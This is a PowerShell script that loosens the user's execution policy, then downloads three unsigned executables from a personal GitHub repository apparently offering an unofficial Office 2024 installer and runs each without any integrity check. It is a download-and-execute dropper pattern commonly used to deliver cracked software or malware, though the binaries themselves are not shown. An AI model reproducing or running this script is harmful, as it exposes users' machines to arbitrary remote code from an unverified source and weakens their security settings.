# Check and set execution policy to RemoteSigned if necessary
$executionPolicy = Get-ExecutionPolicy -Scope CurrentUser
if ($executionPolicy -ne "RemoteSigned" -and $executionPolicy -ne "Unrestricted") {
    Write-Host "Setting execution policy to RemoteSigned..."
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force
}

# Ensure TLSv1.2 is enabled for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# Define an array of download URLs
$DownloadURLs = @(
    "https://github.com/Zigsaw07/office2024/raw/main/Setup1.exe",
    "https://github.com/Zigsaw07/office2024/raw/main/Setup2.exe",
    "https://github.com/Zigsaw07/office2024/raw/main/Setup3.exe"
)

# Loop through each URL
foreach ($DownloadURL in $DownloadURLs) {
    try {
        $FileName = [System.IO.Path]::GetFileName($DownloadURL)
        $FilePath = Join-Path $env:TEMP $FileName

        # Check if the file already exists
        if (Test-Path $FilePath) {
            Write-Host "File already exists ($FilePath). Skipping download."
        } else {
            # Download the file
            Write-Host "Downloading $DownloadURL..."
            Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath -UseBasicParsing

            # Check if download was successful
            if (-not (Test-Path $FilePath)) {
                throw "Download failed for $DownloadURL."
            }
            Write-Host "Download completed."
        }

        # Execute the downloaded file (only if download was successful)
        if (Test-Path $FilePath) {
            Write-Host "Executing $FilePath..."
            Start-Process -FilePath $FilePath -Wait
            Write-Host "$FileName execution completed."
        } else {
            Write-Error "Skipping execution of $FileName because download failed."
        }
    } catch {
        Write-Error "Failed to process $($DownloadURL): $_"
    }
}
